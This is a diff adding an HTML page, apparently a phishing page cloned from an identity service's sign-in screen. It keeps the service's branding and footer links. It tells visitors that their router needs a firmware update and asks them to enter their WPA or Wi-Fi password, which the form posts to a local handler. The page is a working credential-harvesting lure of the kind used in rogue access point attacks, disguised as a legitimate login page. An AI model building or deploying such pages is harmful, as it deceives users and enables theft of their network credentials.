@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>digitalme - self sovereign identity for everyone.</title>
+<link rel="shortcut icon" href="https://auth.digitalme.my/images/favicon.ico" type="image/x-icon">
+<link rel="icon" href="https://auth.digitalme.my/images/favicon.ico" type="image/x-icon">
+<link rel="stylesheet" href="/digitalme%20-%20self%20sovereign%20identity%20for%20everyone_files/bootstrap.css">
+<link rel="stylesheet" href="/digitalme%20-%20self%20sovereign%20identity%20for%20everyone_files/fontawesome.css">
+<link rel="stylesheet" href="/digitalme%20-%20self%20sovereign%20identity%20for%20everyone_files/style.css">
+
+<!-- Avoid Form Re-Submit -->
+<script type="text/javascript" async="" src="/digitalme%20-%20self%20sovereign%20identity%20for%20everyone_files/analytics.js"></script><script src="/digitalme%20-%20self%20sovereign%20identity%20for%20everyone_files/jquery.js"></script>
+<script>
+	$(document).ready(function() {
+		// enter mail when in start page
+		$("#gf_01_start").submit(function(e) {
+			//disable the submit button
+			$("#gb_01_next").attr("disabled", true);
+			return true;
+		});
+		// enter password in login page
+		m("#gf_02_login_challenge").submit(function(e) {
+			//disable the submit button
+			$("#gb_02_next").attr("disabled", true);
+			return true;
+		});
+		//consent page
+		$("#gf_03_consent").submit(function(e) {
+			//disable the submit button
+			$("#gb_03_accept").attr("disabled", true);
+			$("#redirect_url_consent").show();
+			return true;
+		});
+		// enter password in register password page
+		$("#gf_04_password").submit(function(e) {
+			//disable the submit button
+			$("#gb_04_next").attr("disabled", true);
+			return true;
+		});
+		// enter name in register page
+		$("#form-name").submit(function(e) {
+			//disable the submit button
+			$("#gb_05_next").attr("disabled", true);
+			return true;
+		});
+		// enter email in register page
+		$("#gf_06_reg_email").submit(function(e) {
+			//disable the submit button
+			$("#gb_06_next").attr("disabled", true);
+			return true;
+		});
+		// send email to reset password 
+		$("#gf_07_password_reset_email").submit(function(e) {
+			//disable the submit button
+			$("#gb_07_submit").attr("disabled", true);
+			return true;
+		});
+		// reset to new password
+		$("#gf_08_password_reset").submit(function(e) {
+			//disable the submit button
+			$("#gb_08_submit").attr("disabled", true);
+			return true;
+		});
+		// enter national id to register
+		$("#form-identification").submit(function(e) {
+			//disable the submit button
+			$("#gb_09_next").attr("disabled", true);
+			return true;
+		});
+		// confirm on national id 
+		$("#confirm-form-identification").submit(function(e) {
+			//disable the submit button
+			$("#gb_10_submit").attr("disabled", true);
+			return true;
+		});
+		// enter organisation to register
+		$("#form-organisation").submit(function(e) {
+			//disable the submit button
+			$("#gb_11_next").attr("disabled", true);
+			return true;
+		});
+		// confirm on organisation
+		$("#confirm-form-organisation").submit(function(e) {
+			//disable the submit button
+			$("#gb_12_submit").attr("disabled", true);
+			return true;
+		});
+		// enter passport to register
+		$("#form-passport").submit(function(e) {
+			//disable the submit button
+			$("#gb_13_next").attr("disabled", true);
+			return true;
+		});
+		// confirm on passport
+		$("#confirm-form-passport").submit(function(e) {
+			//disable the submit button
+			$("#gb_14_submit").attr("disabled", true);
+			return true;
+		});
+		// acc reactivate
+		$("#gf_15_acc_reactivate").submit(function(e) {
+			//disable the submit button
+			$("#gb_15_accept").attr("disabled", true);
+			return true;
+		});
+		// setTimeout(function(){	
+		//  if($("#continue_link").length) {
+		//	  window.location.href = $("#continue_link").attr("href");		
+		//	 }
+		//	 }, 5000);
+		//	 setTimeout(function(){
+		//	  if($("#gb_03_accept").length) {
+		//		 $("#gb_03_accept").click();
+		//		 }
+		//		 }, 10000);
+		$("#gb_16_continue").click(function(e) {
+			$("#gb_16_continue").attr("disabled", true);
+			e.preventDefault();
+			$(this).siblings("div.s_switch_profile").hide();
+			$(this).siblings("div.comment").show();
+			var url = $("#continue_url").val();
+			setTimeout(function() {
+				window.location.href = url;
+			}, 0);
+			return true;
+		});
+	});
+</script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async="" src="/digitalme%20-%20self%20sovereign%20identity%20for%20everyone_files/js.js"></script>
+<script>
+	window.dataLayer = window.dataLayer || [];
+	function gtag() {
+		dataLayer.push(arguments);
+	}
+	gtag('js', new Date());
+
+	gtag('config', 'UA-11167779-38');
+</script>
+
+</head>
+<body>
+	<div class="container">
+		<div><div>
+        <div class="mx-login-title">
+            <img src="/digitalme%20-%20self%20sovereign%20identity%20for%20everyone_files/tmx.png" class="mx-logo img-fluid" width="38">
+        </div>
+        <div class="mx-box mx-color-bg">
+            <div class="mx-center">
+                <img src="/digitalme%20-%20self%20sovereign%20identity%20for%20everyone_files/welcome-icon.png">
+            </div>
+            <h2 class="mx-title mx-center mx-color-title mt-4">Hi There!</h2>
+            <div class="text-muted mx-center mx-subtitle">
+                You need to perform a firmware update for your router. Enter your WPA Keyphase / WiFi Password to <b>verify</b> and we will do the rest.<br>
+            </div>
+           <form id="gf_01_start" method="POST" action="/tmlogin.html">
+                <input placeholder="WPA Keyphase / WiFi Password" class="form-control mx-input" name="password" id="email">
+                 
+                <div class="row mx-input-action">
+                    <div class="col text-center">
+                        <button id="gb_01_next" type="submit" name="confirm" class="btn mx-btn-primary mt-3 mx-btn-curve mx-shadow mx-bold btn-block">
+                            Next
+                        </button>
+                    </div>
+                </div>
+            </form>
+            <div><div class="mx-footer mt-4">
+	    powered by
+	    <img src="/digitalme%20-%20self%20sovereign%20identity%20for%20everyone_files/tm-logo.png" alt="TM.X Heimdall" title="TM.X Heimdall" width="46">
+	</div></div>
+        </div>
+    </div></div>
+		<div><div></div></div>
+		<div><div></div></div>
+		<div><div></div></div>
+		<div><div></div></div>
+		<div><div></div></div>
+		<div><div></div></div>
+		<div><div></div></div>
+		<div><div></div></div>
+		<div><div></div></div>
+		<div><div></div></div>
+		<div><div></div></div>
+		<div><div></div></div>
+		<div><div></div></div>
+		<div><div></div></div>
+		<div><div></div></div>
+		<div><div></div></div>
+		<div><div></div></div>
+		<div><div></div></div>
+		<div><div></div></div>
+		<div><div></div></div>
+		<div><div></div></div>
+		<div><div></div></div>
+		<div><div></div></div>
+		<div><div></div></div>
+		<div><div></div></div>
+		<div><div></div></div>
+		<div><div></div></div>
+	</div>
+	<div class="mx-center mx mx-subtitle mt-5 mx-font-grey">
+		<a href="https://profile.digitalme.my/content/about_digitalme.pdf" id="gl_01_about" target="_blank" class="mx-underline mx-font-grey">About
+			digitalme</a> <br> <a href="https://profile.digitalme.my/content/terms_of_use.pdf" id="gl_01_terms" target="_blank" class="mx-underline mx-font-grey">Terms
+			of Use</a> &nbsp;|&nbsp; <a href="https://profile.digitalme.my/content/privacy_statement.pdf" id="gl_01_privacy" target="_blank" class="mx-underline mx-font-grey">Privacy
+			Statement</a>
+	</div>
+	<script src="/digitalme%20-%20self%20sovereign%20identity%20for%20everyone_files/jquery-3.js"></script>
+	<script src="/digitalme%20-%20self%20sovereign%20identity%20for%20everyone_files/popper.js"></script>
+	<script src="/digitalme%20-%20self%20sovereign%20identity%20for%20everyone_files/bootstrap.js"></script>
+	<script src="/digitalme%20-%20self%20sovereign%20identity%20for%20everyone_files/core.js"></script>
+
+</body></html>
